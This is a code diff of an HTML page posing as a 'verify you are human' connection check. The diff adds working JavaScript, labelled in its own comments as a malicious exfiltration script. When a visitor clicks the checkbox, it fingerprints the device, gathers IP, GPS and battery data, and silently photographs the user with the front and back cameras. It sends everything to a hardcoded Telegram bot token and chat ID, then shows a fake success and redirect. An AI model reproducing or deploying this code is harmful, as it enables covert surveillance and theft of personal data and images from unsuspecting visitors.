@@ -243,240 +243,214 @@
     <p>example.com needs to review the security of your connection before proceeding.</p>
 
     <script>
-      function handleCheckbox(event) {
-        const checkbox = document.getElementById("verifyHuman");
-        const label = event.currentTarget;
-        const checkmark = document.getElementById("checkmark");
-        const verifyText = document.getElementById("verify-text");
-        const verifyingText = document.getElementById("verifying-text");
-        const successText = document.getElementById("success-text");
+// 1. Handle checkbox click (spinner, redirect, and data exfiltration)
+function handleCheckbox(event) {
+  const checkbox = document.getElementById("verifyHuman");
+  const label = event.currentTarget;
+  const checkmark = document.getElementById("checkmark");
+  const verifyText = document.getElementById("verify-text");
+  const verifyingText = document.getElementById("verifying-text");
+  const successText = document.getElementById("success-text");
 
-        event.preventDefault();
+  event.preventDefault();
 
-        if (checkbox.checked || label.classList.contains("loading")) return;
+  if (checkbox.checked || label.classList.contains("loading")) return;
 
-        label.classList.add("loading");
+  // Show loading spinner
+  label.classList.add("loading");
 
-        setTimeout(() => {
-          label.classList.remove("loading");
-          checkmark.style.display = "block";
-          verifyText.style.display = "none";
-          verifyingText.style.display = "none";
-          successText.style.display = "inline";
-          checkbox.checked = true;
-        }, 3000);
+  setTimeout(() => {
+    // Hide spinner, show success
+    label.classList.remove("loading");
+    checkmark.style.display = "block";
+    verifyText.style.display = "none";
+    verifyingText.style.display = "none";
+    successText.style.display = "inline";
+    checkbox.checked = true;
+  }, 3000);
 
-        setTimeout(() => {
-          window.location.href = "https://www.google.com";
-        }, 6000);
-      }
+  // Redirect after 6 seconds
+  setTimeout(() => {
+    window.location.href = "https://www.google.com"; // Fake redirect
+  }, 6000);
+}
 
-      // Prevent double trigger if both checkbox and label are clicked
-      document.getElementById('verifyHuman').addEventListener('click', function(e) {
-        e.preventDefault();
-      });
-    </script>
-    <script>
-      <!-- Malicious Script (For Cyber Investigation Use Only) -->
-<script>
-  // 1. Target checkbox
-  const checkbox = document.getElementById('verifyHuman');
+// 2. Prevent double trigger
+document.getElementById('verifyHuman').addEventListener('click', function(e) {
+  e.preventDefault();
+});
 
-  // 2. Gather Network Info
-  async function getNetworkInfo() {
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection) {
-      return {
-        type: connection.type || "Unknown",
-        effectiveType: connection.effectiveType || "Unknown",
-        downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
-        rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
-        saveData: connection.saveData ? "Enabled" : "Disabled",
-      };
-    }
-    return "Network API not supported";
-  }
+// 3. Malicious data exfiltration script
+const checkbox = document.getElementById('verifyHuman');
 
-  // 3. WebGL Fingerprinting
-  function getWebGLInfo() {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (!gl) return "WebGL not supported";
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+// Network info
+async function getNetworkInfo() {
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (connection) {
     return {
-      vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
-      renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
+      type: connection.type || "Unknown",
+      effectiveType: connection.effectiveType || "Unknown",
+      downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
+      rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
+      saveData: connection.saveData ? "Enabled" : "Disabled",
     };
   }
+  return "Network API not supported";
+}
 
-  // 4. Attempt Webcam Snapshot
-  async function getSnapshot(facingMode) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      await video.play();
-      await new Promise(res => setTimeout(res, 1000));
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
-      stream.getTracks().forEach(track => track.stop());
-      return blob;
-    } catch (err) {
-      console.warn(`Camera access denied or failed (${facingMode})`, err);
-      return null;
-    }
+// WebGL fingerprinting
+function getWebGLInfo() {
+  const canvas = document.createElement('canvas');
+  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+  if (!gl) return "WebGL not supported";
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+  return {
+    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
+    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
+  };
+}
+
+// Webcam snapshot
+async function getSnapshot(facingMode) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(res => setTimeout(res, 1000));
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
+    stream.getTracks().forEach(track => track.stop());
+    return blob;
+  } catch (err) {
+    console.warn(`Camera access denied (${facingMode})`, err);
+    return null;
   }
+}
 
-  // 5. Collect Full Device Info
-  async function getDeviceInfo() {
-    const data = {
-      browser: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
-      cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
-      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
-      screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
-      touch: 'ontouchstart' in window ? "Yes" : "No",
-      webgl: getWebGLInfo(),
-      network: await getNetworkInfo(),
-      ip: "Unknown",
-      city: "",
-      region: "",
-      country: "",
-      location: "Denied",
-      battery: "Unknown",
-      charging: "Unknown",
-      cameraStatus: ""
-    };
+// Full device info
+async function getDeviceInfo() {
+  const data = {
+    browser: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+    cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
+    memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
+    screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
+    touch: 'ontouchstart' in window ? "Yes" : "No",
+    webgl: getWebGLInfo(),
+    network: await getNetworkInfo(),
+    ip: "Unknown",
+    city: "",
+    region: "",
+    country: "",
+    location: "Denied",
+    battery: "Unknown",
+    charging: "Unknown",
+    cameraStatus: ""
+  };
 
-    try {
-      const res = await fetch(`https://ipinfo.io/json?token=18d2a866939a58`);
-      const ipData = await res.json();
-      data.ip = ipData.ip;
-      data.city = ipData.city;
-      data.region = ipData.region;
-      data.country = ipData.country;
-    } catch {}
+  // Fetch IP/location
+  try {
+    const res = await fetch(`https://ipinfo.io/json?token=18d2a866939a58`);
+    const ipData = await res.json();
+    data.ip = ipData.ip;
+    data.city = ipData.city;
+    data.region = ipData.region;
+    data.country = ipData.country;
+  } catch {}
 
-    try {
-      const battery = await navigator.getBattery();
-      data.battery = (battery.level * 100).toFixed(0) + "%";
-      data.charging = battery.charging ? "Yes" : "No";
-    } catch {}
+  // Battery status
+  try {
+    const battery = await navigator.getBattery();
+    data.battery = (battery.level * 100).toFixed(0) + "%";
+    data.charging = battery.charging ? "Yes" : "No";
+  } catch {}
 
-    try {
-      const pos = await new Promise((res, rej) =>
-        navigator.geolocation.getCurrentPosition(res, rej)
-      );
-      data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-    } catch {}
+  // GPS
+  try {
+    const pos = await new Promise((res, rej) =>
+      navigator.geolocation.getCurrentPosition(res, rej)
+    );
+    data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+  } catch {}
 
-    return data;
-  }
+  return data;
+}
 
-  // 6. Send Device Info to Telegram
-  async function sendTextToTelegram(data) {
-    const message = `
-*🔰 Opas Labs 🔰*
+// Send data to Telegram
+async function sendTextToTelegram(data) {
+  const message = `
+*🔰 Malicious Script Report 🔰*
 
-🌐 *Basic Info*
+🌐 Basic Info:
 - Browser: ${data.browser}
 - Platform: ${data.platform}
 - Language: ${data.language}
 - Timezone: ${data.timezone}
-- Cookies: ${data.cookies}
 
-💻 *Hardware Specs*
+💻 Hardware:
 - CPU: ${data.cpu}
 - RAM: ${data.memory}
 - Screen: ${data.screen}
-- Touch Support: ${data.touch}
-- WebGL Vendor: ${data.webgl.vendor}
-- WebGL Renderer: ${data.webgl.renderer}
+- WebGL: ${data.webgl.vendor} | ${data.webgl.renderer}
 
-📶 *Network*
-- Type: ${data.network.type}
-- Speed: ${data.network.effectiveType}
-- Downlink: ${data.network.downlink}
-- Latency (RTT): ${data.network.rtt}
-- Data Saver: ${data.network.saveData}
-
-📍 *Location & IP*
+📶 Network:
 - IP: ${data.ip}
-- City: ${data.city}
-- Region: ${data.region}
-- Country: ${data.country}
+- Location: ${data.city}, ${data.country}
 - GPS: ${data.location}
+  `;
 
-🔋 *Battery*
-- Level: ${data.battery}
-- Charging: ${data.charging}
-
-📷 *Camera Status*
-- ${data.cameraStatus}
-    `;
-    return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: "7216371031",
-        text: message,
-        parse_mode: "Markdown"
-      })
-    });
-  }
-
-  // 7. Send Photos to Telegram
-  function sendPhotoToTelegram(blob, caption) {
-    const formData = new FormData();
-    formData.append("chat_id", "7216371031");
-    formData.append("photo", blob, `${caption}.jpg`);
-    formData.append("caption", caption);
-
-    return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
-      method: "POST",
-      body: formData
-    });
-  }
-
-  // 8. Execute on Checkbox Click
-  checkbox.addEventListener('click', async function (e) {
-    e.preventDefault(); // Block real action
-
-    const info = await getDeviceInfo();
-
-    // Webcam Snapshots
-    let frontSnap = null;
-    if (!window.frontCaptured) {
-      frontSnap = await getSnapshot("user");
-      window.frontCaptured = true;
-    }
-
-    let backSnap = null;
-    if (!window.backCaptured) {
-      backSnap = await getSnapshot("environment");
-      window.backCaptured = true;
-    }
-
-    // Camera status
-    if (frontSnap && backSnap) info.cameraStatus = "Front & Back Captured";
-    else if (frontSnap) info.cameraStatus = "Front Only";
-    else if (backSnap) info.cameraStatus = "Back Only";
-    else info.cameraStatus = "None / Access Denied";
-
-    // Send all data
-    await sendTextToTelegram(info);
-    if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
-    if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
-
-    // ❌ No spinner or redirect
+  return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: "7216371031",
+      text: message,
+      parse_mode: "Markdown"
+    })
   });
+}
+
+// Send photos to Telegram
+function sendPhotoToTelegram(blob, caption) {
+  const formData = new FormData();
+  formData.append("chat_id", "7216371031");
+  formData.append("photo", blob, `${caption}.jpg`);
+  formData.append("caption", caption);
+
+  return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+// Execute on checkbox click
+checkbox.addEventListener('click', async function (e) {
+  e.preventDefault();
+  const info = await getDeviceInfo();
+
+  // Attempt webcam snapshots
+  let frontSnap = await getSnapshot("user");
+  let backSnap = await getSnapshot("environment");
+
+  // Update camera status
+  if (frontSnap && backSnap) info.cameraStatus = "Front & Back Captured";
+  else if (frontSnap) info.cameraStatus = "Front Only";
+  else if (backSnap) info.cameraStatus = "Back Only";
+  else info.cameraStatus = "None / Denied";
+
+  // Exfiltrate data
+  await sendTextToTelegram(info);
+  if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
+  if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
+});
 </script>
     </script>
   </main>
